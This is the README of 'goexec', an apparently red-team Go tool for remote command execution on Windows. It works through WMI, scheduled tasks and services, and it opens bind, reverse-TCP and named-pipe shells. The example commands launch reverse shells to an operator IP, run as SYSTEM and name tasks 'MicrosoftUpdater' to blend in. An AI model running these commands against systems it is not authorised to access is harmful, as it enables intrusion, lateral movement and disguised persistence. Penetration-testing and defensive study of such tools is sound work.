## goexec

Remote command execution through asynchronous and interactive shells - a variety of options to replicate PsExec/PaExec style functionality depending on needs, requirements and limitations with a high level of customization.

Can be launched from non-domain devices with explicitly specified credentials to achieve interaction with domain-joined devices.

Can also be launched without credentials to runas the current process user (assuming appropriate access on the target).

Not all features of PsExec/PaExec are implemented, such as running within specified user sessions.

Examples and Usage are provided below.

### Features

* Ad-hoc command execution via WMI, Scheduled Tasks or Windows Services
  * All of these rely on SMB to read the resulting command output - task/service names can be customized as needed - if none is specified, a random one is created and deleted following execution.
* Interactive Shells via Named Pipe or Bind/Reverse TCP
  * Either method can be used to achieve a fully interactive shell into either cmd.exe or powershell.exe
  * Both mechanisms require the deployment of an embedded executable onto the target via SMB similar to PsExec - but it can be deployed as ephemeral via WMI or as Scheduled Task in addition to a Service
* Customize task/service names and descriptions if used for deployment
  * Tasks/Services can run as SYSTEM or the explicitly specified user (password must be supplied)
  * WMI always runs as current user (WIP to also achieve SYSTEM elevation)

More to come...

### Usage

```
  -batch
        If true, will copy commands to a batch file on target and execute rather than direct cmd execution - useful for long commands
        Ignored for interactive shells
  -description string
        Description for the service/task - if blank, will use a default description
  -domain string
        Domain for remote authentication - should be FQDN such as domain.com or similar - if blank and user is specified will assume local user
  -dropmethod string
        Method to use for creating named pipe (wmi, task, service) (default "wmi")
  -evasion string (Not yet implemented)
        conhost, diskshadow, ftp
  -ip string
        IP to use for TCP reverse shells connect-back - must specify IP if using reverse TCP mode
  -method string
        Method to use for remote execution (wmi, task, service, pipe, tcp) (default "wmi")
  -name string
        Service/Task/Pipe name to use for remote execution - if blank, will generate a random name
  -nodelete bool
        If true, will not delete the task/service after execution - useful to avoid constantly creating new tasks/services if reconnecting multiple times
  -pass string
        Password for remote authentication
  -port int
        Port to use for TCP shells - must specify port if using TCP mode - default is 4444 (default 8859)
  -reverse
        If true, will create a reverse shell instead of bind shell - for TCP mode - must specify port
  -runas
        If true, will run the task as the user specified in -user flag instead of SYSTEM assuming the user has the correct permissions - does NOT work yet for WMI which will always run as specified user
  -shell string
        Shell to use for TCP shells - default is cmd.exe, valid options are (cmd, ps) (default "cmd")
  -target string
        Remote Hostname or IP address
  -user string
        Username for remote authentication - if domain user, be sure to supply -domain flag
```

### Usage Examples
```
# Enter interactive bind shell via TCP launched via WMI on default ports
goexec.exe -target 192.168.19.154 -method tcp -port 9999

# Enter an interactive reverse shell via named TCP launched via WMI (this may be blocked by default depending)
goexec.exe -target 192.168.19.154 -method tcp -port 9999 -reverse -ip YOUR.LOCAL.IP

# Enter an interactive bind shell over TCP that is launched via a Scheduled Task as SYSTEM
goexec.exe -target 192.168.19.154 -method tcp -port 9999 -reverse -ip YOUR.LOCAL.IP -dropmethod task

# Enter an interactive shell via named pipe launched via WMI
goexec.exe -target 192.168.19.154 -method pipe

# Enter an interactive shell via named pipe launched via Scheduled Task
goexec.exe -target 192.168.19.154 -method pipe -dropmethod task -name MicrosoftUpdater -description "P2PServiceUpdater"

# Enter interactive bind shell via TCP launched via WMI
goexec.exe -target 192.168.19.154 -method tcp -user javanzato -pass UseYourImagination! -domain PYRAMID.LOCAL -port 5555

# Enter interactive reverse shell via TCP launched via WMI
goexec.exe -target 192.168.19.154 -method tcp -user javanzato -pass UseYourImagination! -domain PYRAMID.LOCAL -port 5555 -reverse -ip 192.168.19.1

# Enter interactive reverse shell via TCP launched via Windows Service running as SYSTEM
goexec.exe -target 192.168.19.154 -method tcp -user javanzato -pass UseYourImagination! -domain PYRAMID.LOCAL -port 5555 -reverse -ip 192.168.19.1 -dropmethod service

# Enter interactive reverse shell via TCP launched via Windows Service running as specified user
goexec.exe -target 192.168.19.154 -method tcp -user javanzato -pass UseYourImagination! -domain PYRAMID.LOCAL -port 5555 -reverse -ip 192.168.19.1 -dropmethod service -runas

# Enter a command session to launch ad-hoc commands via WMI against the target (runs as current/specified user)
goexec.exe -target 192.168.19.154 -method wmi -user javanzato -pass UseYourImagination! -domain PYRAMID.LOCAL

# Enter a command session to launch ad-hoc commands via Scheduled Tasks against the target (runs as SYSTEM unless using -runas flag)
goexec.exe -target 192.168.19.154 -method wmi -user javanzato -pass UseYourImagination! -domain PYRAMID.LOCAL

# Enter an interactive shell via named pipe using the specified dropper - Task/Service run as SYSTEM unless using -runas flag
goexec.exe -target 192.168.19.154 -method pipe -dropmethod task -user javanzato -pass UseYourImagination! -domain PYRAMID.LOCAL

# Enter an interactive shell using powershell.exe instead of cmd.exe
goexec.exe -target 192.168.19.154 -method tcp -shell ps -user javanzato -pass UseYourImagination! -domain PYRAMID.LOCAL

```